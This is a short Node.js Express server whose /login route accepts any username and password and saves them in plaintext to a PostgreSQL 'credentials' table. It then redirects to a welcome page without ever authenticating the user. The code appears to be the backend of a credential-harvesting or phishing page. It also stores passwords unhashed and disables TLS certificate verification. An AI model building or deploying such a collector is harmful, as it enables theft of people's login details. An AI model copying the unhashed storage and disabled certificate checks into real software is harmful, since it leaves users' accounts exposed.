require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// PostgreSQL connection pool (only when DATABASE_URL is set)
const dbAvailable = !!process.env.DATABASE_URL;
const pool = dbAvailable
  ? new Pool({
      connectionString: process.env.DATABASE_URL,
      ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
    })
  : null;

// Initialize the credentials table if it doesn't exist
async function initDB() {
  if (!dbAvailable) {
    console.log('No DATABASE_URL set — running in preview mode (credentials will not be saved).');
    return;
  }
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS credentials (
        id        SERIAL PRIMARY KEY,
        username  TEXT NOT NULL,
        password  TEXT NOT NULL,
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);
    console.log('Database ready.');
  } catch (err) {
    console.error('DB init error:', err.message);
    process.exit(1);
  }
}

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// GET /welcome — serve the post-login page
app.get('/welcome', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'welcome.html'));
});

// POST /login — save credentials, redirect to thank-you page
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).send('Username and password are required.');
  }

  if (!dbAvailable) {
    // Preview mode — skip DB insert, just redirect
    return res.redirect('/welcome');
  }

  try {
    await pool.query(
      'INSERT INTO credentials (username, password) VALUES ($1, $2)',
      [username, password]
    );
    res.redirect('/welcome');
  } catch (err) {
    console.error('Insert error:', err.message);
    res.status(500).send('An error occurred. Please try again.');
  }
});

// Start server
initDB().then(() => {
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
});
